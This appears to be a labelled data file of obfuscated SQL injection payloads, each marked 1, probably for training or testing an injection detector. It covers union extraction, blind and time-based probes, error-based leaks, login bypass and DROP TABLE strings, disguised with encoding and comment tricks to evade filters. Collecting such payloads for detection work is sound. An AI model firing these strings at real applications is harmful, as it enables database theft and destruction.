"' UNION SELECT 1,2,3 # more_noise----0m1hr3x4541", 1
"1%27%20oR%20ascII(substriNg(DAtaBasE(),%201,%201))%20%3E%20100%20--", 1
"1'					OR					AScii(SubsTrINg(dATABASE(),					1,					1))					>					100					--", 1
"%27%20An%44%201%3%641%20--%20", 1
"'OR/*%0d%0a*/'1'='1/*%0d%0a*/AND'a'='a'/*%0d%0a*/", 1
"1%27/**/||%20(1%3D1)ascii(substring(database(),%201,%201))%20%3E%20100%20 AND 'a'='a'--", 1
";/**/SELECT				pg_sleep(5);				--", 1
";/*!*/SeLECT PG_sLEEP(5); --", 1
"1%u0027/*!12345*/AND%u0020substring(database(),%u00201,%u00201)%u0020=%u0020%u0027s%u0027%u0020--", 1
";%u0020SELECT%u0020pg_sleep(5);%u0020%u0020--%u0020random_noise--", 1
"%27%20AND%20%31%3dconver%74(int,@%40version) AND 'a'='a'--", 1
"'/**/OR/**/EX%49STS(S%45LECT/**/1%2f**/F%52OM/**/users)----zj2jmg%30%35w%31", 1
"'%20%20%20%20UNION%20%20%20%20SELECT%20%20%20%20null,%20%20%20%20null,%20%20%20%20null%20%20%20%20--%20%20%20%20", 1
"%u0027/*!*/OR/**/1>=1/**/--/**/", 1
";%u0020DROP%u0020TABLE%u0020users;%u0020----e7ytsfcfi2ul", 1
"'%2F*%2112345%2A/anD 1=1  OR 'b'%3D'B'--", 1
";DrOpTABle/*%0a*/usErs;--", 1
"%27%20AND%20extractvalue(1,concat(0x5c,version()))----51kb4dayxwj", 1
"1%2527%2520AND%25%2532%2530subs%2574ring%28da%2574ab%2561se%28%2529%2C%25201%2C%25201%29%2520%253D%2520%2527s%2527%2520--", 1
"admIN'/**/oR '1'='1", 1
"WAITFORDELAY%0a'0:0:5'--%0d%0a#zm732saeaoc5", 1
";/**/DROp/**/TABLe/**/USerS;/**/ # MOrE_NOisE--", 1
"%27%20AND%20extractvalue%281%2Cconcat%280x5c%2Cversion%28%29%29%29%20OR%20%281%29--", 1
"'%20uNIoN selECT NuLL, %6EuLL, Null -%2D%20--392l3qa1wbu9s", 1
"test'/**/OR/**/'1'='1'/**//*#x116ch14bbq9uqz", 1
"' OR '1'>='1--i23l4lfls", 1
"1'%09AND%09substring(database(),%091,%091)%09/*!*/ =%09%09's'%09--#89ztczvd", 1
"'  OR  1 =%091  --", 1
"' UNION SELECT null, null, null -- #si6ni", 1
"1%41ND", 1
"1=1/*%0d%0a*/", 1
"admin%u0027%u0020OR%u0020%u00271%u0027=%u00271%u0020OR%u0020(1)", 1
"%27%20AND%201%3E%3Dconvert(int,@@version)--", 1
"' OR '1'='1 # more_noise#ppkdpo", 1
"'/**/UniON/**/SEL/**/ECT/**/1,2,3--", 1
"'/**/OR/**%2fEXISTS%28SELECT/**/1/**/F%52%4fM/**/users)%2d-", 1
"1%27%20UNIO%4e%20SELECT%20table_name%%32C%20null%%32C%20null%20FROM%20in%66ormatio%6e%5fsc%68em%61.tabl%65s%20--", 1
"teSt%27%20OR%20%271%27%3d%271%27%20%20Or%20%27b%27%3d%27B%27--%20", 1
";/*!%2a/S%45LECT    pg_s%6ceep(5);    --", 1
"1'UNION%0aSELECTtable_name,null,null/*%0a*/FROMinformation_schema.tables/*%0d%0a*/--", 1
"'/**/UNION/**/SELECT/**/null,/**/null,/**/null/**/--/**/#bxb5ghao", 1
"'/**/UNI%4fN S%45LECT null, n%75ll, %6eull --", 1
"; DROP TABLE users;  && (1=1)'a'='a'--#2832cx7x259tjzu", 1
"1))UNION%0aSELECT1,database(),3--", 1
"' O%52 EX%49STS(SELECT%201 %46ROM users)--", 1
"1%u0027%u0020UNION%u0020SELECT%u0020table_name,%u0020null,%u0020null%u0020FROM%u0020information_schema.tables%u0020--#ljfry02dvnkgvgf", 1
"'oREX%49STS(sE%4cect", 1
"1%46RoM%75SerS)--RAND%6fM_NoiSE--", 1
"1'/*!*/OR			IF(substring(database(),			1,			1)%09=/**//**/'a',			SLEEP(5),			0)			----whxpldurxgcrv", 1
"%u0027%u0020Or%u0020exIsTS(SElEcT%U00201%U0020from%U0020USeRs)--", 1
";/*!12345*/SELECT pg_sleep(5);  # more_noise--", 1
"1%u0020AND%u00201=1%u0020/*%21%2a/AN%44%u00201=1", 1
"test%27O/*!*/R%271%27%3D%271%27--/*%0a*/", 1
"%27/*!12345*/AND%201%3D1%20-%2d%20", 1
"'/**/uNIOn/**/sElECT/**/nUlL,/**/nUlL,/**/NuLL/**/--/**/", 1
"'AND%0d%0a1=convert(int,@@version)--%0d%0a", 1
"'/**/AnD/**/1in (1)cONveRT(InT,@@VErSIOn) -- raNdoM_nOiSe--", 1
"'/**%2fA%4eD/%2a*/1	=	convert%28%69nt,@@version)--", 1
"%27/**/AND/**/%31=1/**%2f--/**/", 1
"1%u0027%u0020AND%u0020SUbsTRiNG(DAtaBase(),%u00201,%u00201)%u0020=%u0020%u0027S%u0027%u0020 OR 'b'='b'--#o33z5yx4q88", 1
"%27%20O%52%09exists(sEleCt%091%09frOM%09usERS)%2d-", 1
"1) UNIO%4e %53ELECT 1%2cdatab%61se(),3--", 1
"1)) UNION SELECT 1,database(),3----e9ghjavi4ou0", 1
"1)UNIOn", 1
"seLECt1,dATAbAse(),3--", 1
"1' oR ASc%49I(sUBStriNG(DaTAb%41S%65(), 1, 1)) > 1%300%20--", 1
"1/*!12345*/AND%201%3d1", 1
"%u0027%u0020OR%u00201%20=  %31%u0%3020-%2d%u0%3020  /*!*/AND  1%20=  1", 1
"%57AITFO%52DELAY", 1
"'0:0:5'-%2d", 1
"%3BSELECT%250apg_sleep%285%29%3B%250d%250a--%2F%2A%250d%250a%2A%2F", 1
"%27%20U%4eIO%4e%20SELE%43T%20null,%20null,%20nu%6cl%20--%20", 1
"%27%20anD%20extRaCtvALUE(1,cOnCAt(0x5C,VerSION()))--", 1
"%27%20and%201Like1%20--%20", 1
"'aND%0d%%30aEXTr%61CtValuE(1%2cConc%41t(0X5c,V%45rsION())%29--/*%0d%0a*/", 1
"1 &&%201=1 OR 'b'='b'", 1
"'/**/UNION/**/SELECT/**/null,%20n%75l%6c,/**/null/**/--%20", 1
"%27%20OR%20EXISTS%28SELECT%201%20FROM%20users%29/**/#/**/more_noise--", 1
"1%29%20UNION%20SeLECT%201%2CDataBaSe%28%29%2C3--", 1
"'/**//**//*%2a/XOR/**//**//**/extra%63tvalue(%31,concat(0x5c,versi%6fn(%29%29)-%2d", 1
"WAIT%46OR DELAY%20'0:0:5%27%20/*!*/AND 1=1----l1b95ie5tezzys", 1
"1)/**/unION/**/sEleCT/**/1,DatabAsE(),3--#ljo7t7", 1
"%u0027%u0020OR%u0020%u00271%u0027>=%u00271--cu79f9bqim7l4jm", 1
"1'%20OR IF(SubSTr%69Ng(dATAb%61sE(), 1, 1%29='a', s%4c%65ep(5), 0) --", 1
"test%27%254fR%2F%2A%25%2530d%250a%2A%2F%271%27%3D%271%27%250a%2F%2A%250a", 1
";DROPTABLEusers;%0a--/*%0d%0a*/", 1
"1))%u0020UNION%u0020SELECT%u00201,database(),3 AND 'a'='a'----qttf5", 1
"%27%20OR%20EXISTS%28SELECT%201%20FROM%20users%29%09%09%09%09||%09%09%09%09(1 =  1)'b' =  'b'--", 1
"1%27%20AND%20substring%28database%28%29%2C%201%2C%201%29%20%3D%20%27s%27%20----1d8z1tqtwpy", 1
"%3B%20SELECT%20pg_sleep%285%29%3B%20--#v3hfkxvtehj", 1
"1%u0027%u%30020A%4eD%u0020substring(%64%61t%61base(),%u002%301,%u00201)%u0%302%30	>= %u0020%u0027s%u0027%%750020--", 1
"test'/*!12345*/OR '1'IN (1)'1' --", 1
"%27%20%20AND%20%20extractvalue%281%2Cconcat%280x5c%2Cversion%28%29%29%29--#oehj0hk4fk", 1
";%53ELECT%0apg_sleep(5%29; -- random_noise--%0a", 1
"1%29%2520UNION%2520SELECT%25201%2Cdatabase%28%29%2C3 # more_noise--", 1
"test%27%2F%2A%2112345%2A%2FOR%2F%2A%2A%2F%271%27%3D%271%27%2F%2A%2A%2F--%2F%2A%2A%2F", 1
"%27%20&&%20(1%3D1)extractvalue(1,concat(0x5c,version()))--", 1
"1' OR AsCIi(substRIng(datABasE(), 1, 1)) > 100 --", 1
"%27    OR    '1%27 =%09'1", 1
"1%27%20Or%20if%28sUBsTrING%28DatAbase%28%29%2c%201%2c%201%29%3d%27A%27%2c%20slEEP%285%29%2C%200%29%20--", 1
"test%27%20O/**/R%20%271%27%3D%271%27%20--%20--udibrz9bzeql", 1
"1))UNION/*%0d%0a*/SELECT1,database(),3--", 1
"", 1
"test'OR'1'	='1'/*!*/AND1=1--%0a#lg02jx", 1
"'%20%20%20XOR%20%20%201=%0d%0a1%20%20%20--%20%20%20--9mpb7ej4h7c", 1
"%%32%37%20OR%20EX%49STS%28SELECT%201%20FROM%20user%73)--", 1
"1%2F%2A%2A%2FAND%2F%2A%2A%2F1%3D1", 1
"1AND%250d%250a1%3D1%250d%250a -- random_noise", 1
"%27OR%271%27%3D%271%0d%0a%20OR%20(1)--ih4op24lzocui8", 1
";%20DROP%20TABLE%20users;%20#%0d%0amore_noise--%0a", 1
"1/**/AND/**/1=1--tfswo1iwfb", 1
"1'    OR    IF(substring(database(),    1,    1) =%09'a',    SLEEP(5),    0)    ----izcn7gq", 1
"'%20%20UNION%20%20SELECT%20%201,2,3--", 1
"'||eXiStS(Select1fROm/*%0A*/usErs)--", 1
"t%65st'/**/OR%20'1'='1'/**//* -- random_noise--l9g8g", 1
"WAITFORDELAY'0:0:5'--%0d%0a", 1
"1'/**/O/*!12345*/R/**/if(sUbSTRinG(datAbaSE(),/**/1,/**/1)='A',/**/SLeEP(5),/**/0)/**/--", 1
"1%u0027%09%09%09OR%09%09%09IF(substring(database(),%09%09%091,%09%09%091)	=%09%u0027a%u0027,%09%09%09SLEEP(5),%09%09%090)%09%09%09--", 1
"'/**/XOR/**/'1'IN (1)'1", 1
"admin'%4fR'1'='1%0%61", 1
";SELECT", 1
"pg_sleep(5);--%0d%0a", 1
"%u002%37%u0020UNION%u0020SELE%43T%u002%301,2,3-%2d", 1
"' && extractvalue(1,concat(0x5c,version())) AND 'a'='a'--#pgrfajesntag", 1
"1'ANDsubstring(database(),1,/*%0d%0a*/1)<	=	's'/*%0d%0a*/ /*!*/AND 1=1--", 1
"' aNd ExTrACTVaLUe(1,COncAT(0X5C,verSION()))--", 1
"%u0027%u0020||%u0020%u00271%u0027	=%20%u00271", 1
"1%2527%2520OR%2520IF%28substring%28database%28%29%2C%25201%2C%25201%29%253D%2527a%2527%2C%2520SLEEP%285%29%2C%25200%29%2520--", 1
"%3B%20SELECT%20pG_slEEP%285%29%3B%20--%230gaw66Od8Aa5Ji", 1
"1 AND 1=%31", 1
"wAItFOr/**/deLaY/**/'0:0:5'--", 1
"admin%u0027%u0020%u0020OR%u0020%u0020%u00271%u0027%09=%u0020%u00271", 1
"teST%27%20or%20%271%27%3d%271%27%20--%20", 1
";/*!12345*/DR%4f%50 TABLE u%73ers; --#xzbcp0", 1
"1))/**/UNION/**/SELECT/**/1,database(),3 AND 'a'='a'--", 1
"TesT' Or '1'<='1' /*", 1
"1' AND substriNG(DaTAbAsE(), 1, 1) = 'S' ----l4w1y0", 1
"1)/**/UNION/**/SELECT/**/1,database(),3/**//*!*/AND/**/1IN (1)1--", 1
"tEST' || (1=1)'1'='1' /*", 1
"1)    UNION    SELECT    1,database(),3--", 1
"%27OR/*%0a*/1%3D1%20AND%20%27a%27%3D%27a%27--/*%0a*/%0d%0a", 1
"'/**%2fOR/**/EX%49STS(S%45LECT/**/1/**/FROM/**/u%73e%72s)--", 1
"1%27%20UNION%20SELECT%20table_name,%20null,%20null%20FROM%20information_schema.tables%20----o3i9aja6", 1
"test%27%20OR%20%271%27%3D%271%27%20%20/*!*/AND%201%3D1--%20", 1
"1/*!*/AND 1=1 AND 'a'='a'", 1
"1))UNIONSELECT/*%0a*/1,database(),3/*%0a*/#more_noise----ngeo7wz%0a", 1
"teST'/**/or/**/'1'='1'/**//*", 1
"%u0027%u0020OR%u0020%u00271%u0027%3E%3D%u00271%u0020#%u0020more_noise", 1
"test%27%20%20%20%20%20%20OR%20%20%20%20%20%20%271%27%09%3D%09%271%27%20%20%20%20%20%20/* -- random_noise", 1
"tEST' || '1'='1' /* AND 'a'='a'", 1
"%u0027/*!12345*/OR%u0020EXISTS(SELECT%u00201%u0020FROM%u0020users)%u0020AND%u0020%u0027a%u0027=%u0027a%u0027--", 1
";SelecT%0apG_sLeEp(5);%0d%0a--/*%0a*/", 1
"1' OR ascii(s%75bstring(database%28), 1, 1))%20> %3100 -%2d OR (1)", 1
"WAITFOR     DELAY     '0:0:5'--", 1
"%27/**/UNION/**/SELECT/**/null,/**/null,/**/null/**//**//*!*/AND/**/1%3D1--/**/", 1
"%27 and 1%3d1 --", 1
"1%27/**/AND/**/substr%69ng(database(),/**/1,/**/1)%2f*%2a/=/**%2f's'/%2a%2a/--", 1
"%u0027%u%300%320UN/**/ION%u00%320SELECT%u00%320null,%u0020null%2c%u0020%6eull%%750020--%u0020", 1
"1/*!12345*/AnD%u00201=1", 1
"1'AND%0d%0asubstring(d%61tabase(),%31%2c1)='s'%2d--%2dc%79xreidpzojaru", 1
"TesT'or%0d%0a'1'	=%20'1'--%0d%0a%0D%0a", 1
"test' Or '1'='1' --", 1
"' ANd EXtraCtvALUe(1,Concat(0x5c,VErsiOn()))--", 1
"1/**/AND%u00201>=1", 1
"'AND%0aextractvalue(1,concat(0x5c,version()))--#zhj0vrzn70jdmpt/*%0a*/", 1
"'          OR          EXISTS(SELECT          1          FROM          users)          /*!*/AND          1 =	1--", 1
"'%20%20AND%20%201%20=%201%20%20--%20%20", 1
"1%u0027/**/OR/**/IF(substring(database(),/**/1,/**/1)=%u0027a%u0027,/**/SLEEP(5),/**/0)/**/OR", 1
"%u0027b%u0027=%u0027b%u0027--%0d%0a", 1
"%27%20UN/*!12345*/ION%20SELECT%20null,%20null,%20null%20--%20", 1
"; DROp tAbLe UserS; ----kcjfvb148w", 1
"admin%27%09%09OR%09%09%271%27%2520%3D%2509%271", 1
"'OReXISTs(seLEcT1FROm/*%0a*/USeRs)--", 1
"%27%20AND%201%3D1%20--%20--x345dq7", 1
"1'/**/Or/**/if(sUBstRing(DatabAse(),/**/1,/**/1)='a',/**/sleep(5),/**/0)/**/--", 1
";/*%2a/SELE%43T/**/pg_sleep%285);/**%2f--", 1
";%20sE%4CEcT%20%70G_sLEEP(%35);%20--", 1
"1)) UniOn seLECT 1,DAtaBaSe(),3--#kxhem", 1
"%27					UNION					SELECT					null,					null,					null					--", 1
"1%29UN%2F%2A%21%2A%2FION%0ASELEC%54%0A1%%32Cdatabase%2%38%29%%32C3--%%32%46%2A%250a%2A%2%46", 1
"1))UNION/*%0d%0a*/SELECT%0a1,database(),3", 1
"OR'b'='b'--", 1
"%27%20AND%201%3D1%20%20OR%20%281%29--%20", 1
"a%64min%u0027%%75002%30||%u0020%u00%3271%u0027=%u0%30271%2d-7jn9au3n2snpndu", 1
"1'/*!12345*/UNI%4fN SELECT %74able_name, null, nul%6c FR%4f%4d informati%6fn_schema.ta%62les  %4fR (1)--", 1
"%2527%20OR%20%25271%27%3D%271", 1
"tes%74%2%37%20OR%20%271%27%3D%271%27%2%30--%2%30", 1
"1%2f*!*/%41ND%2f**//**//**//**//**%2f/**/1/**//**/%3d	1", 1
"1'/**/OR ascii(substring(database(), 1, 1)) > 100  AND 'a'='a'--", 1
"tEST%u0027%u0020or%U0020%U00271%u0027=%u00271%U0027%u0020/* OR (1)--zEP5s36mG71t8k", 1
"test'  OR  '1'%20= '1'  --", 1
"%27%20OR%20%271%27%3D%271#o2sg4yn55xd2c4", 1
"W%2541ITFOR%20DELAY%2520%270%3A0%3A5%27%252d-", 1
"1 AND %31<=1", 1
"1' XOR iF(SUbstrIng(DATABASE(), 1, 1)>='A', SLeeP(5), 0) --", 1
"1/*!12345*/%41ND 1=1 -- random_noise--y1g5mhze1p6t", 1
"'		&&		(1%09=/*!*/1)1%09= 1		--", 1
"1 AND%201=1", 1
"WAITFOR%20DELAY%20%270%3A0%3A5%27----u8xvj5o", 1
"1)%20UN/*!12345*/ION%20SELECT%201,database(),3--", 1
"'      AND      1 = 1      --", 1
"admin%u0027%u0020OR%u0020%u00271%u0027<=%u00271", 1
"'%09UNION%09SELECT%091,2,3--", 1
"'OR%0a'1'='1/*%0d%0a*/", 1
"%27%20%2526%26%201%253dC%256FnveRt%28InT%252C%40%40VERsIon%29--", 1
"1%29%20UNION%%320%53ELECT%201%2C%64at%61base%28%29%2%433--", 1
"; DROP TABLE users; --#14qzbd5w", 1
"'OR%0a'1' =%20'1%0aAND'a' =%20'a'/*%0a*/", 1
"1'UNION%0d%0aSELECT/*%0a*/table_name,null,nullFROMinformation_schema.tables--", 1
";/**/SELECT/**/pg_sleep(5);/**/----y2hnb", 1
"1' AND%20%73%75bstring(d%61taba%73e(), 1, 1) = 's' ----9qsnkhb64hjtka", 1
"wAITfOr dELAY '0:0:5' AND 'a'='a'--", 1
"%27%20%7C%7C%201%3D1%20--%20", 1
"%27/**/A/**/ND/**/1IN%20(1)convert(int,@@version)--", 1
"1/*!12345*/AND%201%3C%3D1", 1
"admin%2527%2520OR%2520%25271%2527%253D%25271%20OR%20%27b%27%3D%27b%27", 1
"'/**/AND/**/1%3dco%6evert(i%6et,%40@version)--", 1
"'%20OR/**/EX%49Sts(SeLeCt/**/1/**/fRoM/**/USe%72s)-%2D", 1
"' %55NION SELECT 1,2%2c3-%2d -- random_noise", 1
"1'/**/AND/%2a*/substrin%67(database%28)%2c/**/1,/**/%31)%2f**/>=/**/'s'/**/-%2d", 1
"%27/**/OR/**/1%3D1/**/--/**/", 1
"1%u0027%0%39%09%09%09%09UNION%09%09%09%09%09SE%4cEC%54%09%%309%09%09%09table_nam%65%2c%%309%09%09%09%0%39%6eull,%0%39%09%09%09%09null%09%09%09%0%39%09F%52OM%09%09%09%09%09i%6eformation_schema.tables%%309%09%09%09%09-%2d", 1
"1)/**/uNIon Select 1,DATaBAsE(),3--", 1
"1%27 || (1=1)IF(subs%74ring(d%61tab%61se()%2c 1, 1)='a', SLEEP(5), 0) %2d-", 1
"test'O/**/R'1'='1'--/*%0a*/%0d%0a", 1
"1%2527%2520uNion%2520SelEcT%2520table_NAmE%2C%2520NUll%2C%2520nULl%2520FrOM%2520inFoRMAtioN_schEmA.tAblES%2520--", 1
"' or exISTs(SelEcT 1 froM USers)--", 1
"WAITFOR			DELAY			'0:0:5'--#ft2sjsh8", 1
"' UNION SELECT null, null, null -- #kg46o8", 1
"1%u0027%u0020UNION%u0020SELECT%u0020table_name,%u0020null,%u0020null%u0020FROM%u0020information_schema.tables%u0020%u0020AND%u0020%u0027a%u0027=%u0027a%u0027--", 1
"admin%27%20OR%20%25271%27%3E%3D%27%2531", 1
"1'ORascii(substring(database(),1,1))/*%0d%0a*/>%0a100--/*%0a*/", 1
"%27%20%20%20%20%20%20%20%20OR%20%20%20%20%20%20%20%20%271%27%3C%20%3D%20%20%271", 1
"%31%2527%2520OR%%32%3520IF%2%38s%75bstring%28database%28%29%2C%25%3201%2C%25%3201%29%253D%2527a%2527%%32C%2%3520SLEEP%285%%32%39%2C%25200%29%2520--", 1
"1%u0027UNIONSELECT%0d%0atable_name,null,nullFROMinformation_schema.tables--/*%0a*/", 1
"'/**/And 1LIKECOnVERT(INT,@@vERSiON) OR 'b'='b'--", 1
"1)UNION", 1
"%53%45LECT%0d%0a1,databas%65(),3--/%2a%%30d%0a*/--7zu7v9678b", 1
";%20dROP%20tABLE%20USers;%20--", 1
"%3B%2F%2A%2A%2FSELECT%20%20%20%20%20%20pg_sleep%285%29%3B%20%20%20%20%20%20--%23t5xghho", 1
"1%20  %20    %41ND        1 =	1", 1
"WAITFOR DELAY '0:0:5'--#z15k2xn04l6f0q", 1
"%27%20OR%20EXISTS(SELECT%201%20FROM%20users) AND 'a'='a'--", 1
"%27%20AND%201%3D%63on%76ert(i%6et,@@ve%72sion)--", 1
"%27%20A/*!*/ND%201%3Dconvert(int,@@version) # more_noise--", 1
"test'/**/OR/**/'1'<='1'/**//*", 1
"TEsT' Or%20'%31'='1' %2d-", 1
"'/*!*%2FoR '1%27='1", 1
"1'UNIONSELECTtable_name,%0anull,nullFROMinformation_schema.tables/*%0d%0a*/--random_noise--", 1
"", 1
"1'%20%20UNION%20%20SELECT%20%20table_name,%20%20null,%20%20null%20%20FROM%20%20information_schema.tables%20%20----9c6qf4qzfw18d", 1
"1%U0027%U0020UnIoN%U0020SELecT%u0020TAbLE_NAME,%U0020nulL,%U0020nuLl%U0020from%U0020inFoRmATIoN_scHEMa.TABLEs%u0020--", 1
"%27%20AND%20extractvalue(1,concat(0x5c,version()))----0n5pfbzxwj", 1
"1)%u0020UNION%u0020SELECT%u00201,database(),3 OR (1)--", 1
"%25U0027%25U0020OR%25u00201%3D1%25u0020--%25u0020#2zazWR4", 1
"1' OR IF(SuBSTRiNG(DATABASE(), 1, 1)='A', sLEep(5), 0) --", 1
"'OR1=1--random_noise--%0d%0a", 1
"' O%52 1%3d1 -- #hcj08e8v", 1
"admin%27%20%20%20%20OR%20%20%20%20%271%27%09%3D%20%271 OR 'b'='b'", 1
"test%27%20XOR%20%271%27%3D%271%27%20/*", 1
"'%20OR%20'1'>='1", 1
"; SEL%45CT pg_sleep(5)%3b  -- random_noise--#2%69%6277q6jj0", 1
"%%32%37%20UNION%20S%45LECT%20null%2C%20nu%6cl%2C%20nul%6c%20--%20", 1
"%u0027%u0020||%u00201=1%u0020 -- random_noise--%u0020", 1
"'/**/oR/**/'1'In/**/(1)'1/**/oR/**/'b'='B'", 1
"' OR 1LIKE1 -- --zvy7mo0", 1
"1)/*%2112345*/     UNION      %53ELEC%54     %201,da%74abase()%2c3 OR 'b%27='b'--", 1
"' UNIon seLEct nUlL, null, nULl  XOR (1)--", 1
"1%09%09%09%09%09AND%09%09%09%09%091%20%3E%3D%25091", 1
"1))UNIONSELECT/*%0a*/1,database(),3--", 1
"1%27%20O%52%20ascii%28subst%72ing%28database%%32%38%29%2C%%3201%2C%201%2%39%29%20%3E%20100%20-%2d", 1
"1))UNION/*%0d%0a*/SELECT", 1
"1,database(),3--/*%0a*/", 1
"%27%20oR%20%271%27%20%3d%20%271--rZJtx05Ur", 1
"1'/**/OR ascii(substring(database(), 1, 1)) > 100  OR (1)--", 1
"%27%20A/*!*/ND%201%3D1%20--%20", 1
"'%20OR1=1%2d-%0a--594cb80lu", 1
"1      AND      1%09= 1", 1
"admin'O/*!*/R'1'='1%0d%0aOR'b'='b'", 1
"1) UNION SELECT 1,database(),3----ihbronkjpmwv3f1", 1
"' ANd 1=COnveRT(Int,@@VeRsIoN)--", 1
"' XOR 1=1  # more_noise--", 1
"test%u0027%u0020OR%u0020%u00271%u0027  =	%u00271%u0027%u0020/*", 1
"'AND/*%0d%0a*/1/*!12345*/ = convert(int,@@version)--%0d%0a", 1
"admin%27%20XOR%20%271%27%3D%271", 1
"1%u0027UNIONSELECTtable_name,null,/*%0a*/nullFROMinformation_schema.tables--/*%0a*/--13no1e2xc9t3bte", 1
"1%20AND%201%3D1%20OR%20(1)--1h4ky", 1
"%27%20%20UN/**/ION%20%20SELECT%20%201%2C2%2C3----4tl68oc", 1
"TeSt'/**/Or/**/'1'='1'/**/--/**/", 1
"1%u0027/**/OR/**/If(subStrINg(daTABAse(),/**/1,/**/1)=%u0027A%u0027,/**/SLeEp(5),/**/0)/**/%u0020--%u0020RAnDOm_Noise--", 1
"%u0027/**/OR%u0020EX%49STS(%53ELECT%u00201%u0020FR%4fM%u0020users)-%2d", 1
"WAITFOR%20D%45LAY%u0020%u00270:0:5%27--", 1
"%2527%2520AND%2520extractvalue%281%2Cconcat%280x5c%2Cversion%28%29%29%29----5cmop697jbsq", 1
"1/**/AND/**/1=1/**/OR/**/(1)", 1
"WAIT%46ORDELAY", 1
"'%30:0%3a5'--/*%0a*/", 1
"1%U0027%U0020or%%75002%30As%63%69%69(SUbStRIng%28dataBAse(),%u00201,%u0020%31))%u0%3020>%U%30020100%u0020--", 1
"TEst%27%20%20%20%20OR%20%20%20%20%271%27%09%3D%2520%271%27%20%20%20%20--%20%20%20%20", 1
";/*!1%32345*/SE%4cECT pg_sl%65e%70(5); --", 1
"'%20%20%20UnIoN%20%20%20sElECt%20%20%201,2,3----qGvL1LLi8gNuI6", 1
"%u0027UN/**/IONSELECTnull,null,null--%0a", 1
"test%27%2F%2A%21%2A%2FOR%20%271%27%3D%271%27%20--%20", 1
"1))UNION/*%0a*/SELECT1,database(),3--%0d%0a", 1
"1%29%20UNION%20S%2545LECT%20%2531%2Cdataba%2573e%28%29%252c3--", 1
"' && (1=1)1=convert(int,@@version)--#rccy3lhlv2", 1
"'			UnIoN			SeLECt			NUll,			nUll,			nuLl			--", 1
"1%u0027/**/AND/**/substring(database(),/**/1,/**/1)/**/=/**/%u0027s%u0027/**/--#l6nylu", 1
"1)%09%09%55NION%09%09SE%4cECT%09%091,d%61tabase(),%33%u0020AND%u0020%u0027a%u0027=%u0027a%u0027--", 1
"1'%20AND%20substring(database(),%201,%201)%20%20=	%20's'%20 AND 'a'='a'--", 1
"%27%20%20%20%20%20%20%20%20%20%20UNION%20%20%20%20%20%20%20%20%20%20SELECT%20%20%20%20%20%20%20%20%20%201,2,3%20--%20random_noise--", 1
"1%27%%320UNIO%4e%20SELEC%54%2%30table_n%61me%2C%%320null%2C%20null%20FRO%4d%20inform%61tion_schema.tables%%320 XOR 'a'='a'--", 1
"%27%20AND%201%3Dconvert%28int%2C%40%40version%29 || (1=1)'b'='b'--", 1
"1))UnionSELECT1,dATABaSE(),3--/*%0a*/", 1
"1%27%20A/**/ND%20substring(database(),%201,%201)%20%3D%20%27s%27%20--", 1
"test%27OR%2F%2A%250a%2A%2F%271%27%3D%271%27%250a%2F%2A%250a", 1
"1%27%20A/**/ND%20substring%28database%28%29%2C%201%2C%201%29%20%3D%20%27s%27%20--", 1
"1ANd/*%0D%0A*/1%20=/*!12345*/1%0D%0A", 1
"1)UNIOn/*%0D%0a*/SElEcT1,daTabAsE(),3--", 1
"1%%327%20AND%20s%75bst%72%69ng%28database%2%38%%329%2%43%201%2C%201%29%20%3D%20%27s%27%20--", 1
";%20SELECT%20pg_sleep(5);%20----dtapnb", 1
"%31' UNI%4fN SELECT %74%61ble%5fna%6de, null, null FROM inf%6frmation_schema.tables ---%2d46%32730n9", 1
"1' AND substring(database(), 1, 1) LIKE 's' --", 1
"'/**/||/**/(1=1)'1'='1#f97dnk", 1
"TEST%u0027%u0020OR%U0020%U00271%u0027%3D%U00271%u0027%u0020--%U0020#8qr3hwreQcn", 1
"%27%2509%2509UNION%2509%2509SELECT%2509%25091%2C2%2C3--", 1
"1%20AND%201%3D1 OR 'b'='b'", 1
";/*%2a/S%45%4cECT/**/pg_s%6ceep(5);/**/--", 1
"teST' oR '1'='1' /*", 1
"1%u0027/**/UNION/**/SELECT/**/table_name,/**/null,/**/null/**/FROM/**/information_schema.tables/**//**/AND/**/%u0027a%u0027=%u0027a%u0027----k2oignfvt9hx", 1
"' UNION SELECT 1,2,3--#z048ibz", 1
"%u0027/**/OR/**/%u00271%u0027/*!12345*/ =%20%u00271", 1
"1'/**/OR/**/IF(substring(database(),/**/1,/**/1) = 'a',/**/SLEEP(5),/**/0)/**/--", 1
"adMiN%27%20oR%20%271%27LIKE%271", 1
"1%u0027%u0020A/*!12345*/ND%u0020subs%74r%69ng(da%74a%62ase(),%u00201,%u0020%31)%u0020=%u0020%u0027s%u0027%u0020----j0o59foqowy027g", 1
"1%u0027%55N%49O%4e%20SEL/**/ECTta%62le_name,%0d%0anull,null/*%0d%0a*/FROMinformatio%6e_sch%65ma.table%73/*%0d%0a*/--", 1
"1%u0027%u0020UNION%u0020SELECT%u0020table_name,%u0020null,%u0020null%u0020FROM%u0020information_schema.tables%u0020----1jsj888vjw1", 1
"test%27%20OR%20%271%27%3D%271%27%20/*/*!*/AND/*%0d%0a*/1=1/*%0d%0a*/", 1
"WAITFOR%25u0020DELAY%25u0020%25u00270%3A0%3A5%25u0027----r1wttba8", 1
"test'/*!12345*/OR '1'LIKE'1' --", 1
"' AND 1=1 -- #neo3sq9vtr", 1
"1))/*!*/UNION					SELECT					1,database(),3--", 1
"%u0027%u0020OR%u0020%u00271%27%3c=%u00271", 1
"1%u0027%u0020%u0020%u0020%u0020OR%u0020%u0020%u0020%u0020IF(substring(database(),%u0020%u0020%u0020%u00201,%u0020%u0020%u0020%u00201%29%u0020=%u0020%u0020%u0027%61%u0027,%u0020%u0020%u0020%u0020S%4cEEP(5),%u0020%u0020%u0020%u0020%30%29%20--", 1
";%u0020DROP%20TABLE%u0020use%72s;%u0020%2d---3yh15em92", 1
"; DR%4f%50 TABLE users;%20--", 1
"WaitfOR/*!12345*/delAy '0:0:5'----ctafi55ymx8db57", 1
"WAiTfoR/**/DELay/**/'0:0:5'/**/OR/**/'b'='b'----6WfpFVa9xfjB", 1
"1)/*!*/UNIONSELECT%0a1,database(),3 /*!*/AND 1=1--", 1
"", 1
"'/*!*/AND extractvalue(1,concat(0x5c,version())) OR 'b'='b'--", 1
"1' oR ASCii(sUBsTRiNg(daTABAse(), 1, 1)) > 100 --", 1
"%u0027%u0020anD%u0020exTRACTvaluE(1,conCAT(0X5c,VErsioN()))--", 1
"1%20AND%%320%31%3D1", 1
"1' || (1=1)asCiI(SUBSTRiNG(dAtAbASE(), 1, 1)) > 100  # moRe_noIse--", 1
"1'/**/OR/**/ascii(substring(database(),/**/1,/**/1))/**/>/**/100/**//*!12345*/# more_noise--", 1
"%u0027%u0020A/*!*/ND%u00201=1%u0020--%u0020", 1
